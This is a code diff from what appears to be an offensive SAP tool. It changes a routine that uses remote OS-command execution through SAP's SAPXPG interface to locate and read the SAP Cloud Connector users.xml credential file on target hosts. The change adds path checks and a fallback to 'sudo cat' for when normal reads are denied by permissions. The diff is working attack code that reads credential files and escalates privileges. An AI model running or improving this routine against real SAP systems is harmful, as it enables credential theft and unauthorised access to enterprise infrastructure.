@@ -1840,34 +1840,60 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     "/opt/cloud-connector",
                     "/opt/SAP/cloud-connector",
                 ]
+                # For each candidate path: ls tells us existence; cat reads.
+                # ls prints just the path on success, or an error containing
+                # the path on failure — use startswith to avoid false positives.
+                # Permission denied on cat means SAPXPG subprocess lost the
+                # scc supplementary group; fall back to sudo cat.
                 fpath = None
                 for root in scc_roots:
                     candidate = f"{root}/config/users.xml"
                     r_ls = run_os_command(n, "ls", candidate)
-                    ls_out = "\n".join(r_ls.get("output") or [])
+                    ls_out = "\n".join(r_ls.get("output") or []).strip()
+                    ls_ok = ls_out.startswith(candidate) and \
+                            "Permission denied" not in ls_out and \
+                            "No such file" not in ls_out
                     print(f"[*] SCC {host}: ls {candidate} → "
-                          f"ok={r_ls.get('success')} out={ls_out[:60]!r}")
-                    if r_ls.get("success") and candidate in ls_out:
+                          f"ok={ls_ok} out={ls_out[:60]!r}")
+                    if ls_ok:
+                        fpath = candidate
+                        break
+                    # ls permission denied means dir exists but SAPXPG lacks
+                    # group access — still try cat (different code path)
+                    if "Permission denied" in ls_out:
+                        print(f"[*] SCC {host}: ls permission denied on "
+                              f"{candidate} — will try cat anyway")
                         fpath = candidate
                         break
                 if not fpath:
                     print(f"[-] SCC {host}: users.xml not found via "
                           f"{n.sid} (checked {len(scc_roots)} paths)")
                     continue
-                r2 = run_os_command(n, "cat", fpath)
-                content = "\n".join(r2.get("output") or [])
+
+                def _try_cat(cmd, arg):
+                    r = run_os_command(n, cmd, arg)
+                    return "\n".join(r.get("output") or [])
+
+                content = _try_cat("cat", fpath)
                 print(f"[*] SCC {host}: cat output ({len(content)} chars): "
                       f"{content[:80]!r}")
+                if "Permission denied" in content:
+                    # SAPXPG subprocess dropped scc supplementary group.
+                    # Try sudo cat — works when s4hadm has passwordless sudo.
+                    print(f"[*] SCC {host}: cat permission denied — "
+                          f"trying sudo cat")
+                    content = _try_cat("sudo", f"cat {fpath}")
+                    print(f"[*] SCC {host}: sudo cat ({len(content)} chars): "
+                          f"{content[:80]!r}")
                 if content.strip().startswith("<"):
                     xml_bytes = content.encode("utf-8", errors="replace")
-                    xml_source = (f"on-disk via {n.sid} OS-exec "
-                                  f"({fpath})")
+                    xml_source = f"on-disk via {n.sid} OS-exec ({fpath})"
                     print(f"[+] SCC {host}: users.xml read via {n.sid} "
                           f"({len(xml_bytes)} bytes)")
                     break
                 else:
-                    print(f"[-] SCC {host}: cat returned non-XML content "
-                          f"— may need sudo (owned by sccadm)")
+                    print(f"[-] SCC {host}: could not read {fpath} — "
+                          f"both cat and sudo cat failed")
             except Exception as e:
                 print(f"[-] SCC {host}: OS-exec Path 1 error: {e}")
 
